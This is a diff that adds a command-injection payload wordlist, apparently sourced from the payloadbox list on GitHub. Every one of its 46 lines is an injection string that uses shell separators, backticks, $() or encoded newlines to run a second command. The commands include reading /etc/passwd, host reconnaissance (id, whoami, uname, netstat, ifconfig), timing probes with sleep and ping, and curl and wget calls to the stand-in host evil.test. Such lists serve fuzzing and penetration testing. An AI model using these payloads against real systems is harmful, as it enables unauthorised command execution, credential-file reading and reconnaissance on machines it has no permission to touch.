@@ -1,0 +1,46 @@
+# Source: https://github.com/payloadbox/command-injection-payload-list
+; ls
+; ls -la
+| ls
+| ls -la
+& ls
+&& ls
+|| ls
+`ls`
+$(ls)
+; id
+| id
+& id
+&& id
+; whoami
+| whoami
+& whoami
+&& whoami
+; cat /etc/passwd
+| cat /etc/passwd
+& cat /etc/passwd
+&& cat /etc/passwd
+; uname -a
+| uname -a
+`id`
+$(whoami)
+; ping -c 3 127.0.0.1
+| ping -c 3 127.0.0.1
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+`sleep 5`
+$(sleep 5)
+; curl http://evil.test
+| curl http://evil.test
+; wget http://evil.test
+| wget http://evil.test
+; netstat -an
+; ifconfig
+%0a id
+%0a whoami
+%0a cat /etc/passwd
+|| id;
+; echo vulnerable
+| echo vulnerable
